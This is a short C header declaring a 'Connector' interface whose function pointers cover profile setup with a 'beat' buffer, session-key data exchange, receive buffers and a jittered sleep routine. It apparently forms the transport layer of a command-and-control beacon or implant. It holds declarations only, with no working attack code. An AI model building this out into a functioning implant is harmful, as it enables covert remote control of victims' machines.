#pragma once

#include "WaitMask.h"

typedef struct _Connector Connector;

struct _Connector {
	void* instanceData;

	BOOL (*SetProfile)(Connector* self, void* profile, BYTE* beat, ULONG beatSize);
	BOOL (*WaitForConnection)(Connector* self);
	BOOL (*IsConnected)(Connector* self);
	void (*Disconnect)(Connector* self);
	void (*Exchange)(Connector* self, BYTE* plainData, ULONG plainSize, BYTE* sessionKey);
	BYTE* (*RecvData)(Connector* self);
	int  (*RecvSize)(Connector* self);
	void (*RecvClear)(Connector* self);
	void (*Sleep)(Connector* self, HANDLE wakeupEvent, ULONG workingSleep, ULONG sleepDelay, ULONG jitter, BOOL hasOutput);
	void (*CloseConnector)(Connector* self);
};

void Connector_DefaultSleep(Connector* self, HANDLE wakeupEvent, ULONG workingSleep, ULONG sleepDelay, ULONG jitter, BOOL hasOutput);
BOOL Connector_DefaultWaitForConnection(Connector* self);
BOOL Connector_DefaultIsConnected(Connector* self);
void Connector_DefaultDisconnect(Connector* self);
